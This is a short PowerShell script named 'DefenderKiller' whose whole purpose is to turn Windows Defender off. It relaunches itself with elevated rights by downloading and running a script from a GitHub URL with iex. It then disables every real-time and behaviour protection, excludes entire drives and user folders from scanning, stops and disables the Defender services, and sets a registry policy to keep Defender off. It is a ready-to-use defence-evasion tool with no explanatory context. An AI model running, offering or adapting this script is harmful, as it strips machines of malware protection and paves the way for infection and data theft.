# Disable Windows Defender - One-liner from GitHub
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/DefenderKiller/main/DisableDefender.ps1'))}`"" -Verb RunAs
    exit
}

Write-Host "Disabling Windows Defender..." -ForegroundColor Red

# Disable All Features
@('DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableBlockAtFirstSeen','DisableIOAVProtection','DisablePrivacyMode','DisableArchiveScanning','DisableIntrusionPreventionSystem','DisableScriptScanning') | ForEach-Object {
    Set-MpPreference -$_ $true -ErrorAction SilentlyContinue
}

# Full Exclusions
@('C:\','D:\','E:\',"$env:ProgramFiles","$env:ProgramData","$env:USERPROFILE") | ForEach-Object {
    Set-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue
}

# Stop & Disable Services
Stop-Service -Name WinDefend,WdNisSvc,Sense -Force -ErrorAction SilentlyContinue
Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue

# Registry: Permanent Disable
$reg = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
if (!(Test-Path $reg)) { New-Item $reg -Force | Out-Null }
Set-ItemProperty $reg -Name DisableAntiSpyware -Value 1 -Type DWord -Force

Write-Host "Defender KILLED! Reboot to apply." -ForegroundColor Green
